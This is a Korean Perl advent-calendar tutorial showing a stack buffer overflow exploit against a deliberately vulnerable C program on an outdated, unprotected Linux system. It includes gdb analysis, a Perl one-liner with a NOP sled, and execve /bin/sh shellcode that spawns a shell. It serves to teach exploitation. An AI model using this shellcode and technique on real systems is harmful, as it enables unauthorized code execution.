@@ -1,0 +1,130 @@
+저자
+@h00ray - 시험기간에 공부 안하고 프로그래밍 하는 잉여잉여한 학생
+
+시작하며
+--------
+2014년 들어서 리눅스 환경에서 굵직한 취약점이 발표되고있습니다.
+
+예를들면 
+bash shell shock
+open ssl heart bleed 
+etc...
+
+물론 이번 달력에서 다룰 내용은 위에 나열한 취약점과는 거리가있습니다만...
+그래도 단지 재미를 위해 그리고 리눅스 환경에서의 해킹을 조금이라도 맛 보기(?)위해 메모리 버그의 일종인 bof(BufferOverflow) 즉 버퍼오버플로우라는 기술을 이용해서 리눅스 해킹을 해보도록하겠습니다.
+
+예제
+
+우선 공격할 리눅스 정보입니다.
+
+$uname -a
+Linux localhost.localdomain 2.2.14-5.0 #1 Tue Mar 7 21:07:39 EST 2000 i686 unknown
+
+버전이 매우 낮다는걸 알수있는데 사실 일부로 낮은 버전을 선택했습니다.
+현재 최신 리눅스 커널은 해커들의 공격을 막기위해 많은 보호기법을 도입하고있는데 
+그 예로는 
+공격프로그램(exploit)이 스택이나 힙에서 실행되지 않도록하는 Nx-bit
+메모리상의 공격을 방어하기위해 스택 주소를 랜덤하게 바꾸는 ASLR
+상위주소를 \x00 값으로시작하게하는 즉 NULL처리를 시켜서 공격이 불가능하도록 하는 Ascii-armor
+buffer와 return address에 사이의 임의의 값이 변하면 프로그램을 종료시켜버리는 Canary
+Canary에 대해 더 설명을 하자면 해킹에 성공하기위해서는 eip를 제어해야하는데 eip를 제어할려면 return address를 덮어 씌어야합니다.
+하지만 canary라는 보호기법이 return address를 모니터링하면서 값이 변하면 프로그램을 종료시켜 버리기때문에 한번에 공격할수있는 확률이 줄어들고 난이도도 올라가게됩니다.
+ 
+
+이처럼 다양한 보호기법이 적용되면서 공격이 힘들지만 우회하는 방법이있습니다.
+ROP(Return Oriented Programming)라는 공격기법입니다. 
+이런 무지막지한 보호기법을 우회하려다 보니 매우 복잡하고 어렵다보니 이 달력에서는 설명하지않겠습니다.
+rop에 관한 자세한 내용은 아래 링크를 참조해주세요.
+http://teamcrak.tistory.com/332
+
+그럼 지금부터 메모리 보호기법이 적용되어있지않은 리눅스 커널을 대상으로 간단한 해킹을 해보도록 하겠습니다.
+
+공격할 프로그램입니다.
+//vuln.c
+//gcc -o vuln vuln.c
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+    char buffer[256];
+    strcpy(buffer, argv[1]);
+    printf("%s\n", buffer);
+}
+
+해킹에 성공하기 위해서는 "프로그램 구조를 개발자보다 잘 알아야 한다"라는 말이 있을정도로 
+프로그램의 구조를 완벽하게 이해하고 있어야합니다.
+그렇다면 이제 분석을 하기위해 gdb를 실행 해봅시다.
+$gdb vuln 
+
+(gdb) disass main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %esp,%ebp
+0x80483fb <main+3>:	sub    $0x100,%esp
+0x8048401 <main+9>:	mov    0xc(%ebp),%eax
+0x8048404 <main+12>:	add    $0x4,%eax
+0x8048407 <main+15>:	mov    (%eax),%edx
+0x8048409 <main+17>:	push   %edx
+0x804840a <main+18>:	lea    0xffffff00(%ebp),%eax
+0x8048410 <main+24>:	push   %eax
+0x8048411 <main+25>:	call   0x8048340 <strcpy>
+0x8048416 <main+30>:	add    $0x8,%esp
+0x8048419 <main+33>:	lea    0xffffff00(%ebp),%eax
+0x804841f <main+39>:	push   %eax
+0x8048420 <main+40>:	push   $0x8048480
+0x8048425 <main+45>:	call   0x8048330 <printf>
+0x804842a <main+50>:	add    $0x8,%esp
+0x804842d <main+53>:	leave  
+0x804842e <main+54>:	ret    
+0x804842f <main+55>:	nop    
+End of assembler dump.
+
+대충 봐도 현기증을 유발하는 디어셈블된 코드이지만 우리가 봐야 할 부분은 strcpy함수를 call하는부분 입니다.
+0x8048411 <main+25>:	call   0x8048340 <strcpy> 여기만 주의 깊게 봐주면 됩니다!!!!
+
+그렇다면 보기전에 간단하게 우선 strcpy함수를 알아봅시다.
+strcpy(buffer, argv[1]);
+argv[1]의 값을 buffer에 복사합니다.
+네 끝이에요 한 마디로 
+eax에는 buffer의 값 256byte
+edx에는 argv[1]의 값이 들어가있습니다.
+
+어셈블리 코드를 보면 edx(argv[1]) 값을 push 그후 eax(buffer)를 스택에push
+strcpy(%eax,%edx); 이런식으로 들어가있는겁니다.
+근데 과연 생각한게 맞는지 초호화 디버깅툴인 gdb를 사용해서 확인해보도록 하겠습니다.
+디버깅을 할때 항상 그랬던 것 처럼 break point를 걸어줍니다.
+
+(gdb) b *main+25
+(gdb) r 1
+Starting program: /home/vuln 1
+
+Breakpoint 1, 0x8048411 in main ()
+(gdb) x/s $edx
+0xbffffca0:	 "1"
+
+main+25에 break point를 걸었고 그후 인자를 1을 주고 실행해본결과 edx에는 역시 예상했던데로 1이라는 값이 들어가있습니다.
+이제 0xffffff00이 뭘 뜻하는건지 알아야겠습니다. 16진수이므로 사람이 알아볼수있게 10진수로 바꾸면 256byte라는 값이나오네요.
+256byte를 buffer가 사용하고있으니 256byte +4는 ret주소입니다.
+
+$./vuln `perl -e 'print"A"x260'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+
+perl 스크립트를 사용해서 공격해봤습니다..(펄 달력인데 이제서야 펄이나오네요..ㅜㅜ)
+공격 해보니 역시 ret값을 덮어쓰니 오류를 출력하면서 프로그램이 종료되네요.
+자 이제 exploit script만 작성해주면 끝입니다.
+
+
+$./vuln `perl -e 'print "\x90"x125 , "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80","\x90"x110,"\x38\xf9\xff\xbf"'`
+1?h//shh/bin??°
+                ?8
+bash$
+네 공격에 성공했습니다 ;)
+이제 exploit을 살펴보자면 "\x90"은 nop입니다. 그냥 아무것도 안하고 다음 명령어로 넘어갑니다.
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" 이 부분은 쉘코드입니다. 간단하게 shell을 출력해주는 기계어 집합입니다.
+"\x38\xf9\xff\xbf" 이 부분은 스택의 값인데요. gdb를 통해서 본 스택 주소를 넣어주었습니다.
+
+마치면서
+크리스마스 펄 달력이라는 내용과 맞게 펄에대한 팁이나 재미있는 내용을 주제로 선정했어야하는데... 평소에 해킹을 펄로 하다보니 글을 쓸수있는 주제가 한정되어 많이 아쉽네요.
+그래도 이렇게 기회를 주신 여러 관계자분들께 감사하다는 인사를 보내면서 즐겁게 모두 한 해를 마무리하셨으면 좋겠습니다.
+아 그리고 읽어주셔서 감사합니다!!
